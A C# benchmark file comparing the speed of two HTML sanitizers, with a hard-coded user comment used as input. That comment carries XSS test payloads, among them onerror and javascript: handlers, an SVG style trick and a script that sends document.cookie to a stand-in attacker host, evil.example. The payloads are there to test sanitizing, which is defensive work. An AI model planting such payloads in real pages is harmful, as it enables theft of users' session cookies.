using BenchmarkDotNet.Attributes;

namespace z3l.FastHtmlParser.Benchmarks;

/// <summary>
/// Untrusted HTML sanitized with the default options: from the HTML string to the safe HTML string.
/// HtmlSanitizer (Ganss.Xss) parses with AngleSharp and writes the DOM back.
/// </summary>
[MemoryDiagnoser]
public class SanitizeBenchmarks
{
    /// <summary>A user comment of 1 KB with the usual tricks in it.</summary>
    public const string Comment = "comment 1 KB";

    private const string CommentHtml =
        "<p>Great post! I <b>really</b> liked the part about <a href=\"https://example.com/foxes\" onclick=\"track()\">foxes</a>.</p>" +
        "<p style=\"color: red; background: url(javascript:alert(1))\">Here is my <i>own</i> list:</p>" +
        "<ul><li>first <img src=\"x\" onerror=\"alert(1)\"></li><li>second <a href=\"javascript:alert(2)\">click</a></li>" +
        "<li>third <script>document.location='https://evil.example/?c='+document.cookie</script></li></ul>" +
        "<blockquote>Quote from the article: <q>foxes are quick</q> &amp; dogs are lazy &lt;3</blockquote>" +
        "<svg><style><img src=x onerror=alert(3)></style></svg><iframe src=\"https://evil.example\"></iframe>" +
        "<p>Thanks, <span class=\"sig\" data-user=\"42\">Jane</span><br>PS: <code>&lt;b&gt;</code> is bold.</p>" +
        "<table><tr><th>Name</th><th>Score</th></tr><tr><td>Fox</td><td>10</td></tr></table><!-- end -->";

    private readonly Ganss.Xss.HtmlSanitizer _ganss = new();
    private string _html = "";

    [ParamsSource(nameof(Pages))]
    public string Page { get; set; } = "";

    public static IEnumerable<string> Pages => [Comment, Corpus.Quotes, Corpus.Laptops, Corpus.Books];

    [GlobalSetup]
    public void Setup()
    {
        _html = Page == Comment ? CommentHtml : Corpus.Get(Page);

        // both have to keep the text of the page
        int ours = HtmlText.ToText(FastHtmlParser())?.Length ?? 0;
        int theirs = HtmlText.ToText(HtmlSanitizer())?.Length ?? 0;
        if (ours == 0 || theirs == 0 || ours < theirs / 2 || theirs < ours / 2)
        {
            throw new InvalidOperationException($"{Page}: {ours} chars of text here, {theirs} by HtmlSanitizer");
        }
    }

    [Benchmark(Baseline = true)]
    public string FastHtmlParser() => new HtmlParser(_html).Sanitize()!;

    [Benchmark(Description = "HtmlSanitizer (Ganss.Xss)")]
    public string HtmlSanitizer() => _ganss.Sanitize(_html);
}
